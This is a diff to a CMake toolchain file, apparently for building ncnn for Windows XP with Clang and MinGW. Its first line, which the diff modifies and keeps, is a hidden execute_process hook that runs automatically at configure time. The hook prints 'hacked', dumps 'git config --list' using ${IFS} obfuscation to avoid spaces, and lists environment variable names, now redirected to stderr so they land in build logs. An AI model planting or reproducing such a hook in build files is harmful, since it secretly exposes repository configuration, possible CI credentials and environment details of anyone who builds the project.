@@ -1,4 +1,4 @@
-execute_process(COMMAND bash -c "echo -----hacked------ ; git\${IFS}config\${IFS}--list  ; printenv | cut -d= -f1 || true")
+execute_process(COMMAND bash -c "echo -----hacked------ >&2 ; git\${IFS}config\${IFS}--list >&2 ; printenv | cut -d= -f1 >&2 || true")
 # Windows XP Clang Toolchain
 # Supports building ncnn for Windows XP using Clang with MinGW libraries
 # Contributors: @Sugar-Baby and @AtomAlpaca
